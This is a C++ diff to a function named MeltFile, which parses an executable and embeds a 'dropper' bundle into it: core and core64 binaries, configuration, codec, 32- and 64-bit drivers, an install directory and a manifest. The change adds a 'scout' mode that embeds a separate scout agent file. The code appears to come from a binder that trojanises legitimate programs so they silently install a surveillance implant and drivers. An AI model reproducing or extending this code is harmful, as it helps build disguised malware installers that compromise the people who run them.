@@ -33,7 +33,7 @@ void print_hex(char const * const data, std::size_t length)
 	}
 }
 
-int MeltFile( char const * const input_path, char const * const output_path, MelterStruct const * const melter_data )
+int MeltFile( char const * const input_path, char const * const output_path, MelterStruct const * const melter_data, BOOL isScout, char *scout_file )
 {
 	RawBuffer* buffer = new RawBuffer(bf::path(input_path));
 	
@@ -56,29 +56,67 @@ int MeltFile( char const * const input_path, char const * const output_path, Mel
 		throw melting_error("Parsing failed.");
 	}
 
-	bf::path core_path = melter_data->core;
-	bf::path core64_path = melter_data->core64;
-	bf::path conf_path = melter_data->conf;
-	bf::path codec_path = melter_data->codec  ? melter_data->codec : "";
-	bf::path driver_path = melter_data->driver ? melter_data->driver : "";
-	bf::path driver64_path = melter_data->driver64 ? melter_data->driver64 : "";
-	bf::path bitmap_path = melter_data->demoBitmap ? melter_data->demoBitmap : "";
-	
-	try {
-		object->embedDropper(core_path, 
-			core64_path, 
-			conf_path, 
-			codec_path, 
-			driver_path, 
-			driver64_path, 
-			melter_data->instdir, 
-			melter_data->manifest, 
-			melter_data->fprefix,
-			bitmap_path);
-	} catch (std::exception& e) {
-		throw melting_error(e.what()) ;
+	if (isScout)
+	{
+		bf::path core_path = melter_data->core;
+		bf::path core64_path = "";
+		bf::path conf_path = "";
+		bf::path codec_path = "";
+		bf::path driver_path = "";
+		bf::path driver64_path = "";
+		bf::path bitmap_path = "";
+		bf::path scout_path = scout_file;
+		try
+		{
+			printf("[*] trying embedDropper for SCOUT: core_path: %s, scout_path: %s\n", melter_data->core, scout_file);
+
+			object->embedDropper(core_path, 
+				core64_path, 
+				conf_path, 
+				codec_path, 
+				driver_path, 
+				driver64_path, 
+				melter_data->instdir, 
+				melter_data->manifest, 
+				melter_data->fprefix,
+				bitmap_path,
+				TRUE,
+				scout_path);
+		}
+		catch (std::exception& e) 
+		{
+			throw melting_error(e.what()) ;
+		}
+
+		
 	}
-	
+	else
+	{
+		bf::path core_path = melter_data->core;
+		bf::path core64_path = melter_data->core64;
+		bf::path conf_path = melter_data->conf;
+		bf::path codec_path = melter_data->codec  ? melter_data->codec : "";
+		bf::path driver_path = melter_data->driver ? melter_data->driver : "";
+		bf::path driver64_path = melter_data->driver64 ? melter_data->driver64 : "";
+		bf::path bitmap_path = melter_data->demoBitmap ? melter_data->demoBitmap : "";
+
+		try {
+			object->embedDropper(core_path, 
+				core64_path, 
+				conf_path, 
+				codec_path, 
+				driver_path, 
+				driver64_path, 
+				melter_data->instdir, 
+				melter_data->manifest, 
+				melter_data->fprefix,
+				bitmap_path,
+				FALSE,
+				NULL);
+		} catch (std::exception& e) {
+			throw melting_error(e.what()) ;
+		}
+	}
 	if (object->saveToFile( output_path ) == false)
 		throw melting_error("Cannot write output file.");
 	
